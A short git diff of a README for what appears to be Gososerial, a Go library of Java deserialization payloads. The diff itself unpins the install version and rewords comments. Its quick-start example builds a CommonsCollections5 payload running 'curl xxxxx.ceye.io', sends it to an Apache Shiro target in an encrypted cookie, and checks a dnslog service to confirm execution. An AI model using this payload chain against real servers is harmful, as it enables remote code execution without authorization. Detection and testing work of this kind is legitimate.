@@ -34,7 +34,7 @@ List of Supported
 ## Quick Start
 
 ```shell
-go get github.com/EmYiQing/Gososerial@v0.0.2
+go get github.com/EmYiQing/Gososerial
 ```
 
 ```go
@@ -64,9 +64,9 @@ func TestFindShiro(t *testing.T) {
 	// Use CommonsCollections5 Payload
 	var payload []byte
 	payload = gososerial.GetCC5("curl xxxxx.ceye.io")
-	// HTTP Request
+	// Send Cookies Encrypted By AES
 	shiro.SendPayload(key, payload, target)
-	// Use Dnslog API
+	// Receive Results Using Dnslog API
 	if ceye.CheckResult("your_ceye_token") {
 		log.Info("find shiro!")
 	}
